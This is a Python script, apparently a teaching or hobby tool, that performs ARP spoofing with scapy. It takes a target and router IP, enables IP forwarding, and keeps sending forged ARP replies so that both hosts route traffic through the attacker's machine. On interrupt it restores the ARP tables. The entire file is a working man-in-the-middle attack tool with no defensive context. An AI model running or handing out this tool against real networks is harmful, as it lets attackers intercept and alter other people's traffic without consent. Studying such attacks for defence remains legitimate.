import subprocess
import sys

import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip",
                        help="Target IP")
    parser.add_argument("-r", "--router", dest="router_ip",
                        help="Router IP")
    return parser.parse_args()


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[
        0]
    return answered_list[0][1].hwsrc


def spoof(target, spoof_ip):
    target_mac = get_mac(target)
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


try:
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ", shell=True)
    sent_packets_counts = 0
    options = get_arguments()

    target_ip = options.target_ip
    router_ip = options.router_ip

    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_counts = sent_packets_counts + 2
        print("\r[+] Packets Sent : {}".format(str(sent_packets_counts))),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] Detected Keyboard Interrupt .... Resetting ARP Table")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("[+] ARP Table reset done")
